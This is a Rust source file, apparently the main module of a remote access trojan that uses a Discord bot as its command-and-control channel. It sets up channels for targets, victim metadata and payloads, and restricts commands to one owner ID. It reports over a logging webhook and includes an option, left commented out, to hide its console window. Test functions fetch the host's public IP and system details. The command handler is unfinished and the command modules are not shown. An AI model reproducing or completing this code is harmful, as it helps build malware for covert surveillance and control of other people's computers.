// #![windows_subsystem = "windows"]
#![allow(non_snake_case, unused_must_use)]
#[allow(unused_imports)]

mod formats;
mod utilities;
mod commands;
use formats::*;
use utilities::*;
use commands::{
    target::*,
    owner::*
};

use serenity::framework::standard::DispatchError;
use serenity::json::{Value, json};
use serenity::model::{
    prelude::Activity,
    user::OnlineStatus,
};
use serenity::{async_trait, http};
use serenity::framework::StandardFramework;
use serenity::framework::standard::macros::*;
use serenity::model::{
    channel::{Message, Channel},
    gateway::Ready,
    id::UserId,
};
use serenity::prelude::*;
use sysinfo::{System, SystemExt, UserExt, *};
use dotenv;

struct Handler;

#[async_trait]
impl EventHandler for Handler {
    // when an unknown even occurs this event will be called
    async fn unknown(&self, ctx: Context, name: String, value: Value) {
        println!(
            " {} Unknown event occurred\n   name = {}\n   value = {}",
            Pr::err(),
            name,
            value
        );
    }

    // Set a handler for the `message` event - so that whenever a new message
    // is received - the closure (or function) passed will be called.
    //
    // Event handlers are dispatched through a threadpool, and so multiple
    // events can be dispatched simultaneously.
    async fn message(&self, ctx: Context, mut msg: Message) {
        let rat_config = RatConfig::new(TARGETS_CHANNEL_ID, METADATA_CHANNEL_ID, PAYLOADS_CHANNEL_ID);
        if msg.content.starts_with(BOT_PREFIX) {
            msg.content = msg.content.trim_start_matches(BOT_PREFIX).to_string();
                
            // TODO
        }
    }

    // Set a handler to be called on the `ready` event. This is called when a
    // shard is booted, and a READY payload is sent by Discord. This payload
    // contains data like the current user's guild Ids, current user data,
    // private channels, and more.
    //
    // In this case, just print what the current user's username is.
    async fn ready(&self, ctx: Context, ready: Ready) {
        // send a webhook in the LOGS channel saying that the bot is now online
        send_log_webhook(LOG_WEBHOOK.to_string(), "Bot is now online!").await;

        // set custom status and on do not disturb mode
        ctx.set_presence(
            Some(Activity::watching(format!("prefix {}", BOT_PREFIX))),
            OnlineStatus::DoNotDisturb
        ).await;

        let rat_config = RatConfig::new(TARGETS_CHANNEL_ID, METADATA_CHANNEL_ID, PAYLOADS_CHANNEL_ID);
        let embed = target_embed().await;
        rat_config.config_targets_channel(&ctx).await;
        rat_config.send_target_embed(&ctx).await;

        // print that the bot is now online and ready to use
        println!(" {} {} is connected!", Pr::bot(), ready.user.tag());
    }
}

#[tokio::main]
async fn main() {
    clear_console();
    println!(" {} Script start up", Pr::app());
    // Configure the client with your Discord bot token in the environment.
    dotenv::dotenv().expect("Couldn't load .ENV");
    let token = dotenv::var("TOKEN").expect("Couldn't load token");
    // Set gateway intents, which decides what events the bot will be notified about
    let intents = GatewayIntents::all();

    let framework = StandardFramework::new()
        .configure(|c| c.owners(
            vec![
                UserId(523990741543026689)
            ].into_iter().collect())
            .case_insensitivity(true)
            .prefix(BOT_PREFIX)
            .allow_dm(false)
        )
        .group(&GENERAL_GROUP)
        .group(&OWNERCOMMANDS_GROUP)
        .on_dispatch_error(error_handler);

    // Create a new instance of the Client, logging in as a bot. This will
    // automatically prepend your bot token with "Bot ", which is a requirement
    // by Discord for bot users.
    let mut client =
        Client::builder(&token, intents)
            .event_handler(Handler)
            .framework(framework).await
            .expect("Error creating client");

    // Finally, start a single shard, and start listening to events.
    //
    // Shards will automatically attempt to reconnect, and will perform
    // exponential backoff until it reconnects.
    // {
    //     let mut data = client.data.write().await;
    //     data.insert::<ShardManagerContainer>(Arc::clone(&client.shard_manager));
    // }

    if let Err(why) = client.start_autosharded().await {
        // if bot couldn't start up send a log message via webhook
        println!(" {} Couldn't start bot :(", Pr::err());
        send_log_webhook(
            LOG_WEBHOOK.to_string(),
            format!("An error occurred :( while trying to start the bot: {}", why).as_str()
        ).await;
    }
}


#[hook]
async fn error_handler(
    ctx: &Context,
    msg: &Message,
    err: DispatchError,
    command_name: &str
) {
    match err {
        DispatchError::OnlyForOwners => {
            msg.channel_id.send_message(&ctx.http, |m| m
                .content(format!(" {} you're not allowed to use Owner only commands", msg.author.mention()))
            ).await;
            println!(" {} {} tried to use owner only command '{}{}'",
                Pr::err(),
                msg.author.tag(),
                BOT_PREFIX,
                command_name
            );
        },
        _ => {}
    }
}







#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    // #[test]
    fn get_ip() {
        type Store = HashMap::<String, String>;
        let res = reqwest::blocking::get("https://api.ipify.org?format=json");

        let a = res.unwrap().json::<Store>().unwrap();
        
        println!("RES: {:?}", a);
        let e = if a.contains_key("ip") {
            a.get("ip").unwrap().to_owned()
        } else {
            String::from("undefined")
        };
        println!("json: {}", e);
    }

    #[test]
    fn sys_info() {
        let system = System::new_all();
        let test = system.uptime();

        println!(" : {:?}", test);
    }

    // #[test]
    fn prefix_msgs() {
        println!(" {} Couldn't start bot :(", Pr::app());
        println!(" {} Couldn't start bot :(", Pr::bot());
        println!(" {} Couldn't start bot :(", Pr::err());
        println!(" {} Couldn't start bot :(", Pr::event());
    }
}



























































































































